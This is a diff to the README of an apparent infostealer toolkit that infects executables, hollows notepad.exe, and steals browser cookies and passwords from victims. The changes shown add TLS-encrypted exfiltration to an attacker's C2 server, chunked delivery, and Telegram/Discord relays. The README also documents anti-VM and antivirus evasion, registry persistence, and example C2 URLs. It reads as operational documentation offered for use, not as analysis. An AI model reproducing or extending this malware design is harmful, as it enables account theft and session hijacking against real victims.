@@ -41,7 +41,7 @@ shipped prebuilt) extracts cookies on a Windows machine and POSTs them back.
   |   infect host (byte       |   deliver    |   -> loader (hollowing)   |
   |   append + sentinel patch)|  --------->  |   -> XOR-decrypt payload  |
   |                           |              |   -> extract cookies      |
-  | listen.py  (HTTP C2)      |<-------------|   -> HTTP POST (Winsock2) |
+  | listen.py  (HTTP/TLS C2)  |<-------------|   -> HTTPS POST (schannel) |
   |   loot/ + TG/Discord      |   JSON       |   fallback: pipe / file   |
   +---------------------------+              +---------------------------+
 ```
@@ -214,8 +214,9 @@ The end-to-end infection and exfiltration chain:
    key stage described under *Chromium cookie decryption*.
 5. **Extraction.** The payload extracts cookies from Chrome / Edge / Brave / Vivaldi / Opera
    (Chromium-based) and Firefox on the **victim's** machine.
-6. **Exfiltration.** The payload sends the cookies via HTTP POST (Winsock2) to the attacker's
-   C2 URL as Cookie-Editor JSON.
+6. **Exfiltration.** The payload POSTs the cookies to the attacker's C2 URL as
+   Cookie-Editor JSON -- over TLS by default (`https://`, schannel in-process),
+   in chunks split on record boundaries, with a 200 response required per chunk.
 7. **Reception.** `listen.py` receives the JSON, merges/dedups against the existing collection
    (keyed on `domain`+`name`+`path`), and writes `loot/`.
 8. **Import.** The attacker imports `loot/session_cookies.json` (or `all_cookies.json`) into
@@ -256,7 +257,7 @@ python auto.py --clear-discord              :: remove Discord from config
 | `--telegram <token:chat_id>` | Telegram relay (saved to config.json) |
 | `--discord <webhook_url>` | Discord relay (saved to config.json) |
 | `--persist` | Enable registry Run key persistence (saved to config.json) |
-| `--c2 <url>` | Override C2 URL (e.g. `http://PUBLIC_IP:9400/`). Use when victim is outside your LAN. GUI: "DETECT PUBLIC IP" button |
+| `--c2 <url>` | Override C2 URL (e.g. `https://c2.example.com/` or `http://PUBLIC_IP:9400/`). `https` uses the payload's schannel transport and defaults to 443. Use when victim is outside your LAN. GUI: "DETECT PUBLIC IP" button |
 | `--no-anti-vm` | Disable VM MAC / debugger / sandbox checks (patch `CKAV0000` -> `CKAV0001`). Use for VM targets |
 | `--find-port` | Scan ports 9400-9500 and use the first free one. Saved to `config.json` |
 | `--config` | Show saved relay settings and exit |
@@ -287,10 +288,10 @@ DETECT PUBLIC IP / TEST C2 buttons, FIND BEST PORT (scans 9400-9500, saved to
 for .exe, infect, view JSON/TXT, open loot/ifec, rebuild, stop sink. Tag map for target
 classification (`bom`, `one-shot`, `risky`, `avoid`, `incompatible`, `out`).
 
-### `listen.py` -- HTTP listener
+### `listen.py` -- HTTP/TLS listener
 
 ```bat
-python listen.py [port] [--telegram <token:chat>] [--discord <webhook_url>]
+python listen.py [port] [--telegram <token:chat>] [--discord <webhook_url>] [--tls-cert <pem>] [--tls-key <pem>]
 ```
 
 - Default port 8080 when called without arguments (auto.py starts it on the configured port)
@@ -298,9 +299,14 @@ python listen.py [port] [--telegram <token:chat>] [--discord <webhook_url>]
   listener reaches LISTENING in under 1 second)
 - ThreadingHTTPServer: the Telegram/Discord relay runs inside `do_POST` without stalling
   concurrent payload POSTs; `SAVE_LOCK` around loot writes
+- `--tls-cert` + `--tls-key` wrap each connection in the worker thread (min TLS 1.2).
+  On the VPS this is unnecessary: Caddy terminates TLS and proxies to the plain listener
+  on `127.0.0.1`. The flags exist for a direct-TLS listener or a bench.
 - Dedup by `(domain, name, path)`, keeping the most recent value
 - Web UI: `GET /` (summary), `GET /all` (JSON), `GET /passwords` (JSON), `GET /session` (session JSON)
 - Relay: `--telegram` and `--discord` forward a summary of each batch via HTTPS
+- Chunked delivery: the payload tags each POST with `X-CookieLog-Chunk: i/n`; every chunk
+  is a complete `{"records":[...]}` envelope and only the last carries `coverage`
 
 ### `cookielog.py` -- legacy extractor
 
@@ -749,20 +755,42 @@ the loader's plaintext sentinels.
 If `g_c2_url` still starts with `CKC2` after patching (no C2 configured), the payload
 falls back to the local pipe / file path.
 
-### Winsock2 exfiltration
+### Exfiltration transport (Winsock2 + schannel)
 
-The payload uses raw **Winsock2** (`WSAStartup` -> `socket` -> `inet_addr` -> `connect` ->
-`send`) for the HTTP POST, not WinHTTP/WinINet. WinHTTP/WinINet fail inside a hollowed process
-with error `12029` ("proxy configuration unavailable") because the hollowed process never
-initialized the WinHTTP proxy subsystem. Raw Winsock2 has no such dependency.
+The payload never touches WinHTTP/WinINet: inside a hollowed process they fail with
+error `12029` ("proxy configuration unavailable") because the host process never
+initialized the proxy subsystem. Sockets are raw **Winsock2**
+(`WSAStartup` -> `socket` -> `connect` -> `send`).
 
-The HTTP request is built manually (`POST / HTTP/1.1\r\nHost: ...\r\nContent-Length: ...\r\n
-Connection: close\r\n\r\n`) and the body is sent in 32 KB chunks, with a retry loop
-(3 attempts, 1 s between) around the full connect+send cycle.
+`http://` posts plain HTTP. `https://` (the default in the deploy path) runs a
+TLS 1.2 client over the same socket using **schannel** (`secur32.dll`):
+
+- `SCHANNEL_CRED` with `SCH_CRED_MANUAL_CRED_VALIDATION` and `SP_PROT_TLS1_2_CLIENT`
+  (TLS 1.3 is still absent on some Windows 10 builds); SNI is the target host.
+- The server certificate is validated after the handshake with
+  `CertGetCertificateChain` + `CertVerifyCertificateChainPolicy(CERT_CHAIN_POLICY_SSL)`
+  against the system roots and the hostname. No request is sent on a bad chain.
+- Every output token uses a caller-owned 64 KB buffer. When `pvBuffer` is NULL,
+  SspiCli allocates the token itself, and on some hosts that allocation fails with
+  `SEC_E_INSUFFICIENT_MEMORY` / `GetLastError` 1450 before a single byte is built
+  (the Negotiate package fails the same way, so it is the allocator). curl passes
+  its own buffer for the same reason.
+- The request is built by hand (`POST / HTTP/1.1\r\nHost: ...\r\nContent-Length: ...`)
+  and each write goes through `EncryptMessage`; the close path sends `close_notify`
+  so the listener sees a clean TLS EOF.
+
+**Chunked delivery.** Records are serialised once and their offsets kept, so a dump
+is split on record boundaries without re-serialising: at most 600 records or 384 KB
+per POST. Every chunk is a complete `{"records":[...]}` envelope; only the last one
+carries `,"coverage":{...}}` and is tagged `X-CookieLog-Chunk: i/n`. A chunk is only
+accepted when the listener answers `HTTP/1.x 200` (for TLS the response record is
+decrypted before the status line is read); each chunk gets 4 attempts with
+500 / 1000 / 2000 ms backoff. A stalled chunk therefore costs that chunk, not the
+dump.
 
 Exfiltration priority in the payload:
 
-1. **HTTP POST to C2** -- if the sentinel was patched with a URL.
+1. **HTTPS/HTTP POST to C2** -- if the sentinel was patched with a URL.
 2. **Named pipe** `\\.\pipe\ck_pipe` -- if `sink.py` is running locally (20 retries, 250ms each).
 3. **Local file** `C:\ProgramData\MediaCache\cache.json` -- final fallback.
 
@@ -771,7 +799,8 @@ Exfiltration priority in the payload:
 `ckdll.dll` is built without the C runtime to stay small and injectable:
 
 - `/NODEFAULTLIB /ENTRY:payload_entry /DYNAMICBASE:NO /BASE:0x5F000000`
-- `/GUARD:NO /MACHINE:X64`, linked against `kernel32.lib crypt32.lib bcrypt.lib` only.
+- `/GUARD:NO /MACHINE:X64`, linked against
+  `kernel32.lib crypt32.lib bcrypt.lib iphlpapi.lib secur32.lib` only.
 - Custom `memcpy` / `memset` / `memmove` / `memcmp` implementations (no CRT).
 - Manual FIPS 180-4 SHA-256 implementation for domain hash verification (no CRT hash).
 - `/Od /Oi-` -- **optimization disabled**. The compiler's SSE-vectorized `memcpy` crashes
@@ -982,7 +1011,10 @@ Full version history in **[CHANGELOG.md](CHANGELOG.md)**.
 
 | Version | Highlights |
 |---|---|
-| **v6** (current) | Bugfix round: false-positive anti-VM (struct layout) that made the payload exit silently on physical machines, growable exfil buffer, 120 s loader wait, full Local State read, HTTP retry, persistence moved to the loader, loader hardening (XOR API names, version resource), build hygiene, handle-hijack stack-frame crash fix, Linux attacker support (`sink.py` FIFO, platform guards) |
+| **v12** (current) | TLS 1.2 C2 in the payload (schannel, chain + hostname validation, caller-owned token buffers), record-boundary chunking with per-chunk `200` ACKs, listener `--tls-cert/--tls-key`, https-aware `auto`/`c2auth`, VPS bootstrap TLS default |
+| v11 | v20 key stage folded into the loader: embedded `ckdec` helper, CLSID discovery, elevated gate, non-elevated skip |
+| v10 | Coverage manifests (`records` + `coverage`), CEF/Electron stores, Firefox sessionstore parsing, password discovery by profile |
+| v6 | Bugfix round: false-positive anti-VM (struct layout) that made the payload exit silently on physical machines, growable exfil buffer, 120 s loader wait, full Local State read, HTTP retry, persistence moved to the loader, loader hardening (XOR API names, version resource), build hygiene, handle-hijack stack-frame crash fix, Linux attacker support (`sink.py` FIFO, platform guards) |
 | v5 | AV evasion: XOR-encrypted payload, dynamic API resolution, `notepad.exe` hollowing, `--c2`/`--no-anti-vm` flags, GUI public IP + TEST C2 + NAT warning |
 | v4 | UTF-8 passthrough fix, SHA256 domain hash verification, manual FIPS 180-4 SHA-256, `session_break.py` cryptanalysis |
 | v3 | Handle hijacking (browser-locked DBs), 2 MB buffer, loot file renaming, hidden `~ck_bak.bin` |
